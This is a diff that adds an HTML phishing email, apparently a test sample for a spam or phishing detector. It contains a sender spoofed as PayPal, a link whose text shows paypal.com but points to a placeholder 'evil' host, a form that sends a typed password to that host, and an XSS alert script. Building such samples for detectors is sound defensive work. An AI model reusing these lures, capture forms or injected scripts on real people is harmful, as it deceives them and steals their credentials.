@@ -1,0 +1,19 @@
+From: security@paypa1-verify.xyz
+To: victim@example.com
+Subject: URGENT!!! Your Account Will Be SUSPENDED - ACT NOW!!!
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+<body>
+<h1>CONGRATULATIONS!! YOU HAVE WON $$$</h1>
+<p>CLICK HERE NOW to claim your FREE GIFT before LIMITED TIME expires!!!</p>
+<p>URGENT ACTION REQUIRED: Your account has been compromised!</p>
+<p>Click here to verify: <a href="https://evil.phishing.xyz/steal">https://paypal.com/verify</a></p>
+<p>Or use this link: <a href="https://bit.ly/abc123">Reset Password</a></p>
+<form action="https://evil.phishing.xyz/capture">
+<input name="password" placeholder="Enter your password">
+<button>Submit</button>
+</form>
+<script>alert('xss')</script>
+</body>
+</html>
